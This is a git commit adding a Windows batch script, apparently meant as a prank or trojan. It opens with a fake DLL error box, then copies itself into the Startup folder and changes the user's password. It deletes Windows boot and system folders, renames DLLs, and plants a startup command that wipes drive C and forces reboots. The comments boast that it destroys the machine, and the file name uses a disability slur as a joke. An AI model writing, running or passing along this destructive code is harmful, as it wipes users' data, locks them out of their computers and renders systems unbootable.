a1d5c148e9f78ec81d96df79f44396f264b64a32
mysterek_ <59736397+mysterek1337@users.noreply.github.com>
2022-03-29 15:42:38 +0200

    Create autistic.bat

---
+++ autistic.bat
@@ -0,0 +1,19 @@
+echo MsgBox "msvcp100.dll error",17,"ERROR"> a.vbs
+a.vbs
+
+@echo off
+echo THIS PART WILL TURN OFF REGEDIT, CMD, CHANGE WALLPAPER, AND SHUTDOWN / FORMAT / DELETE C:
+copy ez.bat => "C:\Users%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+net user %username% NoEscapeEZZE
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /t Reg_dword /v DisableRegistryTools /f /d 0
+shutdown /s /t 20
+rd c:\windows\boot /s /q
+rd c:\windows\system32\catroot /s /q
+rd c:\windows\system32\catroot2 /s /q
+ren *.dll %random%.ezdll
+echo most files are impact, so lets add startup so if u "SURVIVE", you will get death screen lmfao
+cd "C:\Users%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+echo MsgBox "this is the end. goodbye!!",17,"ERROR"> a.vbs
+echo "shutdown /r /t 5 && rd c: /s /q"> start.bat
+powershell wininit
+shutdown /r /t 1
